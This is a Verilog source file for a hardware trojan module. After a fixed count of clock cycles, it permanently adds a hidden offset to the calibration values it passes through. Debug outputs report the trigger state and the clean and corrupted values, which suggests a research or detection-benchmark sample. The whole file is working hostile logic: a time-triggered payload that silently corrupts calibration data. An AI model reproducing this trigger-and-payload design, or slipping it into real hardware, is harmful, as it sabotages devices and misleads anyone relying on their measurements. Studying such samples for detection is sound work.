`timescale 1ns/1ps

module calibration_memory_interface_trojan #(
    parameter integer DATA_WIDTH = 16,
    parameter [15:0] TRIGGER_CYCLES = 16'd521,
    parameter signed [DATA_WIDTH-1:0] PAYLOAD_OFFSET = 16'sd160
) (
    input  wire                         clk,
    input  wire                         reset_n,
    input  wire signed [DATA_WIDTH-1:0] calibration_in,
    output reg  signed [DATA_WIDTH-1:0] calibration_out,
    output reg                          trojan_triggered,
    output reg                          payload_active,
    output reg  [15:0]                  trigger_counter,
    output reg  signed [DATA_WIDTH-1:0] clean_calibration_value,
    output reg  signed [DATA_WIDTH-1:0] trojan_calibration_value
);
    wire trigger_now;
    wire signed [DATA_WIDTH-1:0] shifted_calibration_value;

    assign trigger_now =
        !payload_active &&
        (trigger_counter >= (TRIGGER_CYCLES - 1'b1));
    assign shifted_calibration_value = calibration_in + PAYLOAD_OFFSET;

    always @(posedge clk or negedge reset_n) begin
        if (!reset_n) begin
            calibration_out          <= {DATA_WIDTH{1'b0}};
            trojan_triggered         <= 1'b0;
            payload_active           <= 1'b0;
            trigger_counter          <= 16'd0;
            clean_calibration_value  <= {DATA_WIDTH{1'b0}};
            trojan_calibration_value <= {DATA_WIDTH{1'b0}};
        end else begin
            clean_calibration_value <= calibration_in;

            if (!payload_active && trigger_counter < TRIGGER_CYCLES)
                trigger_counter <= trigger_counter + 1'b1;

            if (trigger_now) begin
                trojan_triggered <= 1'b1;
                payload_active   <= 1'b1;
            end

            if (payload_active || trigger_now) begin
                calibration_out          <= shifted_calibration_value;
                trojan_calibration_value <= shifted_calibration_value;
            end else begin
                calibration_out          <= calibration_in;
                trojan_calibration_value <= calibration_in;
            end
        end
    end
endmodule
